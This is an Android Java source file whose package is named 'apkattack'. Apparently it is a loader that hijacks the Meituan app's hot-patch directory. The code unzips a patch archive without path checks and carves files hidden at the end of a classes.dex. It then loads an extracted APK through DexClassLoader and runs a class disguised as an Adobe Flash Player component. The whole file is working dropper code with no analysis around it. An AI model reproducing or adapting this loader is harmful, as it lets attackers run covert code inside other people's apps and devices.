package com.example.apkattack;




import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import dalvik.system.DexClassLoader;
import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

@SuppressLint("SdCardPath") public class MeituanDexUnshell {

	public static void meituanDexUnshell(){
		String TAG = "meituanDexUnshell";
		
		Log.e(TAG,"start");
		try {
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(TAG, "context null");
				return;
			}else{
				Log.e(TAG, "get context ok,package:" +context.getPackageName()+"/" +context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(TAG, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
	        
	        String packagename = context.getPackageName();
	        String dexpath = "/data/data/" + packagename + "/files/patch/";
	        File dexfiles[] = new File(dexpath).listFiles();
	        String dexfn = "";
	        for(int i = 0;i < dexfiles.length;i ++){
	        	if (dexfiles[i].isFile()) {
	        		String dexfilename = dexfiles[i].getName();
		        	if(dexfilename.endsWith(".apk") || dexfilename.endsWith(".zip")||
		        			dexfilename.contains("1979")||dexfilename.contains("2496")||
		        			dexfilename.contains("2505")){
		        		dexfn = dexpath + dexfilename;
		        		
		        		
				        ZipEntry zipEntry = null;
				        byte unzipbuf[] = new byte[0x10000];
				        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(dexfn)));

			            while ( (zipEntry = zipIn.getNextEntry()) != null) {
			            	File unzipfile = new File(dexpath + zipEntry.getName());
			                if (zipEntry.isDirectory()) {
			                	unzipfile.mkdirs();
			                	Log.e(TAG,"unzip make folder:" + zipEntry.getName());
			                } else {
			                    File unzipparent = unzipfile.getParentFile();
			                    if (unzipparent.exists() == false) {
			                    	unzipparent.mkdirs();
			                    	
			                    	Log.e(TAG,"unzip make parent folder:" + unzipparent.getName());
			                    }
			                    
			                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
			                    int readedBytes = 0;
			                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
			                        fileOut.write(unzipbuf, 0, readedBytes);
			                    }
			                    fileOut.close();
			                }
			                zipIn.closeEntry();
			            }
			            zipIn.close();
			            
			            Log.e(TAG,"unzip complete");
			            
			            break;
					}
		        }
			}
	        
	   
	        
	        
	        File dexFile = new File(dexpath+"classes.dex");
	        if (dexFile.exists() == false) {
	        	Log.e(TAG, "not found dex file:" + dexfn);
				return;
			}
	        int dexfs = (int)dexFile.length();
	        byte [] buf = new byte[dexfs];
	        FileInputStream fin = new FileInputStream(dexFile);
	        fin.read(buf,0,dexfs);
	        fin.close();

            int offset = dexfs - 1;
            int fc = buf[offset];
            if (fc < 2 || fc > 4) {
	        	Log.e(TAG, "error files count:" + fc);
				return;
			}
            
            String dstpath = context.getFilesDir().getAbsolutePath() + "/";
    		File dstpathFile = new File(dstpath);
    		if (dstpathFile.exists() == false) {
				dstpathFile.mkdirs();
			}
    		
        	String apkfn = "";
        	for (int i = 0; i < fc; i++) {
				offset -= 16;
				int fnlen = 0;
				for( fnlen = 0 ;fnlen < 16; fnlen ++){
					if (buf[offset + fnlen] == 0) {
						break;
					}
				}
				if (fnlen > 16) {
					return;
				}
				byte[]filename = new byte[fnlen];
				System.arraycopy(buf, offset, filename, 0, fnlen);
				String fn = new String(filename);
				if (fn.endsWith(".apk")) {
					apkfn = fn;
				}
				String dstfn = dstpath + fn;

				byte[] bdatasize = new byte[4];
				offset -= 4;
				System.arraycopy(buf, offset, bdatasize, 0, 4);
				int datasize = ((bdatasize[0]&0xff)<<24) +
						((bdatasize[1]&0xff)<<16)+
						((bdatasize[2]&0xff)<<8)+
						((bdatasize[3]&0xff));

				offset -= datasize;
				
				File dstFile = new File(dstfn);
				if (dstFile.exists() == false) {
					dstFile.createNewFile();
				}
				
				FileOutputStream fout = new FileOutputStream(dstFile);
				fout.write(buf,offset,datasize);
				fout.close();
			}
            
	    	String appcachepath = context.getCacheDir() + "/";

	    	DexClassLoader dexcl = new DexClassLoader(dstpath + apkfn, appcachepath, null,context.getClassLoader());
	    	
	    	String dexmethodname = "start";
	    	//String cfgfn = "ark.dat";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,dstpath);
    	    
    	    Log.e(TAG, "sofireRelease load apk success");

		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}
}
